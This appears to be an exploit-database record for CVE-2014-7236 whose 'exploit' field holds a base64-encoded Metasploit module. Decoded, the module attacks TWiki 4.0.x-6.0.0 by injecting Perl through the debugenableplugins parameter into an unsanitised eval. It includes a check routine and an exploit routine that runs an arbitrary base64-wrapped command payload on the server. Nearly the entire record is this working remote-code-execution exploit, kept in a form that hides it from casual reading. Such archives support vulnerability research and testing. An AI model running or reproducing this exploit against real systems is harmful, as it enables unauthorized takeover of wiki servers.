{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KY2xhc3MgTWV0YXNwbG9pdDMgPCBNc2Y6OkV4cGxvaXQ6OlJlbW90ZQ0KICBSYW5rID0gRXhjZWxsZW50UmFua2luZw0KDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6Okh0dHBDbGllbnQNCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvID0ge30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCiAgICAgICdOYW1lJyA9PiAnVFdpa2kgRGVidWdlbmFibGVwbHVnaW5zIFJlbW90ZSBDb2RlIEV4ZWN1dGlvbicsDQogICAgICAnRGVzY3JpcHRpb24nID0+ICVxew0KICAgICAgICBUV2lraSA0LjAueC02LjAuMCAgY29udGFpbnMgYSB2dWxuZXJhYmlsaXR5IGluIHRoZSBEZWJ1ZyBmdW5jdGlvbmFsaXR5Lg0KICAgICAgICBUaGUgdmFsdWUgb2YgdGhlIGRlYnVnZW5hYmxlcGx1Z2lucyBwYXJhbWV0ZXIgaXMgdXNlZCB3aXRob3V0IHByb3BlciBzYW5pdGl6YXRpb24NCiAgICAgICAgaW4gYW4gUGVybCBldmFsIHN0YXRlbWVudCB3aGljaCBhbGxvd3MgcmVtb3RlIGNvZGUgZXhlY3V0aW9uDQogICAgICB9LA0KICAgICAgJ0F1dGhvcicgPT4NCiAgICAgICAgWw0KICAgICAgICAgICdOZXRhbmVsIFJ1YmluJywgIyBmcm9tIENoZWNrIFBvaW50IC0gRGlzY292ZXJ5DQogICAgICAgICAgJ2gwbmcxMCcsICMgTWV0YXNwbG9pdCBNb2R1bGUNCg0KICAgICAgICBdLA0KICAgICAgJ0xpY2Vuc2UnID0+IE1TRl9MSUNFTlNFLA0KICAgICAgJ1JlZmVyZW5jZXMnID0+DQogICAgICAgIFsNCiAgICAgICAgICBbICdDVkUnLCAnMjAxNC03MjM2J10sDQogICAgICAgICAgWyAnT1NWREInLCAnMTEyOTc3J10sDQogICAgICAgICAgWyAnVVJMJywgJ2h0dHA6Ly90d2lraS5vcmcvY2dpLWJpbi92aWV3L0NvZGV2L1NlY3VyaXR5QWxlcnQtQ1ZFLTIwMTQtNzIzNiddDQogICAgICAgIF0sDQogICAgICAnUHJpdmlsZWdlZCcgPT4gZmFsc2UsDQogICAgICAnVGFyZ2V0cycgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsgJ0F1dG9tYXRpYycsDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICdQYXlsb2FkJyAgICAgICAgPT4NCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAnQmFkQ2hhcnMnID0+ICIiLA0KICAgICAgICAgICAgICAgICAgJ0NvbXBhdCcgICAgICA9Pg0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgJ1BheWxvYWRUeXBlJyA9PiAnY21kJywNCiAgICAgICAgICAgICAgICAgICAgICAnUmVxdWlyZWRDbWQnID0+ICdnZW5lcmljIHBlcmwgcHl0aG9uIHBocCcsDQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAnUGxhdGZvcm0nID0+IFsndW5peCddLA0KICAgICAgICAgICAgICAnQXJjaCcgPT4gQVJDSF9DTUQNCiAgICAgICAgICAgIH0NCiAgICAgICAgICBdDQogICAgICAgIF0sDQogICAgICAnRGVmYXVsdFRhcmdldCcgID0+IDAsDQogICAgICAnRGlzY2xvc3VyZURhdGUnID0+ICdPY3QgMDkgMjAxNCcpKQ0KDQogICAgcmVnaXN0ZXJfb3B0aW9ucygNCiAgICAgIFsNCiAgICAgICAgT3B0U3RyaW5nLm5ldygnVEFSR0VUVVJJJywgWyB0cnVlLCAiVFdpa2kgcGF0aCIsICcvZG8vdmlldy9NYWluL1dlYkhvbWUnIF0pLA0KICAgICAgICBPcHRTdHJpbmcubmV3KCdQTFVHSU4nLCBbdHJ1ZSwgIkEgZXhpc3RpbmcgVFdpa2kgUGx1Z2luIiwgJ0JhY2t1cFJlc3RvcmVQbHVnaW4nXSkNCiAgICAgIF0sIHNlbGYuY2xhc3MpDQogIGVuZA0KDQoNCiAgZGVmIHNlbmRfY29kZShwZXJsX2NvZGUpDQogICAgdXJpID0gdGFyZ2V0X3VyaS5wYXRoDQogICAgZGF0YSA9ICJkZWJ1Z2VuYWJsZXBsdWdpbnM9I3tkYXRhc3RvcmVbJ1BMVUdJTiddfSUzYiIgKyBDR0kuZXNjYXBlKHBlcmxfY29kZSkgKyAiJTNiZXhpdCINCg0KICAgIHJlcyA9IHNlbmRfcmVxdWVzdF9jZ2khKHsNCiAgICAgICdtZXRob2QnID0+ICdQT1NUJywNCiAgICAgICd1cmknID0+IHVyaSwNCiAgICAgICdkYXRhJyA9PiBkYXRhDQogICAgfSkNCg0KICAgIHJldHVybiByZXMNCiAgZW5kDQoNCg0KICBkZWYgY2hlY2sNCiAgICByYW5kXzEgPSByYW5kX3RleHRfYWxwaGEoNSkNCiAgICByYW5kXzIgPSByYW5kX3RleHRfYWxwaGEoNSkNCg0KICAgIGNvZGUgPSAicHJpbnQoXCJDb250ZW50LVR5cGU6dGV4dC9odG1sXFxyXFxuXFxyXFxuI3tyYW5kXzF9XCIuXCIje3JhbmRfMn1cIikiDQogICAgcmVzID0gc2VuZF9jb2RlKGNvZGUpDQoNCiAgICBpZiByZXMgYW5kIHJlcy5jb2RlID09IDIwMA0KICAgICAgcmV0dXJuIENoZWNrQ29kZTo6VnVsbmVyYWJsZSBpZiByZXMuYm9keSA9PSByYW5kXzEgKyByYW5kXzINCiAgICBlbmQNCiAgICBDaGVja0NvZGU6OlVua25vd24NCiAgZW5kDQoNCg0KICBkZWYgZXhwbG9pdA0KICAgIGNvZGUgPSAicHJpbnQoXCJDb250ZW50LVR5cGU6dGV4dC9odG1sXFxyXFxuXFxyXFxuXCIpOyINCiAgICBjb2RlICs9ICJyZXF1aXJlKCdNSU1FL0Jhc2U2NC5wbScpO01JTUU6OkJhc2U2NC0+aW1wb3J0KCk7Ig0KICAgIGNvZGUgKz0gInN5c3RlbShkZWNvZGVfYmFzZTY0KCcje1JleDo6VGV4dC5lbmNvZGVfYmFzZTY0KHBheWxvYWQuZW5jb2RlZCl9JykpO2V4aXQiDQogICAgcmVzID0gc2VuZF9jb2RlKGNvZGUpDQogICAgaGFuZGxlcg0KDQogIGVuZA0KDQplbmQ=", 
    "filename": "platforms/php/remote/36438.rb", 
    "id": "36438", 
    "cves": [
        "CVE-2014-7236"
    ]
}